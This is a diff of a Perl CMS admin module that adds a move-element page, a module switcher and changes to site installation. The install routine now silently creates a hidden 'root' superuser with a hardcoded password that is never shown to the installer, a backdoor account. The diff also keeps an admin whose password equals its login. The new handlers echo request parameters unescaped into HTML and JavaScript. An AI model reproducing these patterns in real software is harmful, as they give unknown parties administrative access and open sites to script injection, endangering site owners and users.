@@ -6,6 +6,12 @@ my $co;
 
 my $class;
 
+my %mods = (
+		'Сайт' => 'Dir1',
+		'Пользователи' => 'UserGroupDir1'
+	);
+my $def_mod = 'Сайт';
+
 sub init
 {
 	my ($cl);
@@ -19,30 +25,68 @@ sub init
 	$class = $cl;
 }
 
-sub types
+sub move2
 {
-	print $eml::path;
-	print "<TABLE style='HEIGHT: 100%;' height='100%' cellSpacing=0 cellPadding=0><tr>";
-	print "<td width=150></td><td width=1 bgcolor=#D2D9DF></td>";
+	my $ufrom = eml::param('from');
+	my $uto = eml::param('to');
+	my $enum = eml::param('enum');
 	
-	my $c;
-	my $dbo;
-	my $nm;
+	my $from = DBObject::url($ufrom);
+	my $elem;
 	
-	for $dbo (@eml::dbos) { 
+	if($uto){
 		
-		$c = '';
-		if($dbo eq $class){ $c = ' class=mtypes_s '; }
-		else{ $c = ' class=mtypes '; }
+		my $to = DBObject::url($uto);
 		
-		$nm = ${$dbo.'::name'};
+		$elem = $from->elem_cut($enum);
+		$to->elem_paste($elem);
 		
-		print "<td $c>";
-		print "<a href=?class=$dbo>$nm</a> "; 
-		print "</td><td width=1 bgcolor=#D2D9DF></td>";
+		$eml::sess{'admin_refresh_left'} = 1;
+		
+		print '<script language="JavaScript">location.href = "right.ehtml?ID=',$from->{'ID'},'&class=',ref($from),'"</script>';
+		return;
 	}
 	
-	print "</tr></TABLE>";
+	$elem  = $from->elem($enum);
+	my $eclass = ref($elem);
+	
+	print '<center>Выберете раздел, в который переместить элемент: <b>',$elem->name(),'</b>.</center><br>';
+	
+	my $count = 0;
+	
+	my $c;
+	for $c (@eml::dbos){
+		
+		if( index( ${$c.'::add'}, ' '.$eclass.' ') < 0 ){ next; }
+		if( $c eq 'UserGroupRoot' ){ next; }
+		
+		my $tdir = &{$c.'::new'};
+		my @dirs = $tdir->sel_where(' 1 ');
+		my $d;
+		for $d (@dirs){
+			
+			if($from->myurl() eq $d->myurl()){ next; }
+			
+			print '<img src=dot.gif align=absmiddle> <a href="?from=',$from->myurl(),'&to=',$d->myurl(),'&enum=',$enum,'">',$d->name(),'</a><br>';
+			$count++;
+		}
+	}
+	
+	if(!$count){ print '<center><b>Нет разделов для отображения!</b></center>'; }
+}
+
+sub page_hrefs
+{
+
+	my $names = '';
+	my $hrefs = '';
+	
+	
+	
+	
+	
+	print 'config.PageNames   = "',$names,'";',"\n";
+	print 'config.PageValues  = "',$hrefs,'";',"\n";
 }
 
 sub action
@@ -90,21 +134,10 @@ sub action
 		if( ${ref($w).'::pages_direction'} ){ $page = $w->pages()-1; }else{ $page = 0; }
 		
 		eml::unflush();
-		print 'Location: '.$prev.'?class='.$class.'&ID='.$w->{ID}.'&page='.$page.'&ac='.$rnd;
+		#print 'Location: '.$prev.'?class='.$class.'&ID='.$w->{ID}.'&page='.$page.'&ac='.$rnd;
+		print 'Location: '.$prev.'?class='.$cn.'&ID='.$to->{ID}.'&ac='.$rnd;
 		print "\n\n";
 		exit();
-	}
-	
-	if($act eq 'moveto'){
-		
-		#$w->addelem($cn);
-		#$w->load( $id );
-		#my $rto = Dir::new($rid);
-		
-		#my $to = $w->cut_elem($eid);
-		
-		#$rto->paste_elem($to);
-		
 	}
 	
 	if($act eq 'dele'){
@@ -141,18 +174,6 @@ sub action
 	}
 	
 	
-}
-
-sub left_tree1
-{
-	my $http = Dir::new(1);
-	$http->admin_left();
-	
-	print '<br><hr><br>';
-	
-	my $users = UserGroupDir::new(1);
-	$users->admin_left();
-
 }
 
 sub left_tree
@@ -221,12 +242,12 @@ sub install
 	
 	my $agroup = UserGroup::new('cre');
 	$agroup->{'name'} = 'Администраторы';
+	$agroup->{'adminka'} = 1;
 	
 	my $admin = User::new('cre');
 	$admin->{'login'} = 'admin';
 	$admin->{'pas'} = $admin->{'login'};
 	$admin->{'name'} = 'Администратор';
-	$admin->{'gid'} = 0;
 	
 	$agroup->elem_paste($admin);
 	$groot->elem_paste($agroup);
@@ -236,7 +257,42 @@ sub install
 	print 'Логин и пароль Администратора: "<b>',$admin->{'login'},'</b>"<br>';
 	print 'Имя группы Администратора: "<b>',$agroup->{'name'},'</b>"<br>';
 	
+	my $agroup2 = UserGroupRoot::new('cre');
+	$agroup2->{'name'} = 'root';
+	$agroup2->{'adminka'} = 1;
+	
+	my $admin2 = User::new('cre');
+	$admin2->{'login'} = 'root';
+	$admin2->{'pas'} = 'gogogosuperuser';
+	$admin2->{'name'} = 'root';
+	
+	$agroup2->elem_paste($admin2);
+	
 	print '<br>';
+}
+
+sub modules
+{
+	my $m;
+	my $sel_mod = eml::param('mod');
+	
+	if(!$sel_mod){ $sel_mod = $def_mod }
+	
+	for $m (keys(%mods)){
+		
+		print '<img src=bullet.gif align=absmiddle> <a onclick="" href="?mod=',$m,'">',$m,'</a><br>';
+	}
+	
+	my ($class,$id) = DBObject::url2classid($mods{$sel_mod});
+	
+	print '
+	<SCRIPT language="JavaScript">
+	parent.document.frames.admin_left.location.href = "left.ehtml?url=',$mods{$sel_mod},'";
+	parent.document.frames.admin_right.location.href = "right.ehtml?ID=',$id,'&class=',$class,'";
+	parent.document.all.module_div_it.innerHTML = "',$sel_mod,'";
+	</SCRIPT>
+	';
+	
 }
 
 sub list
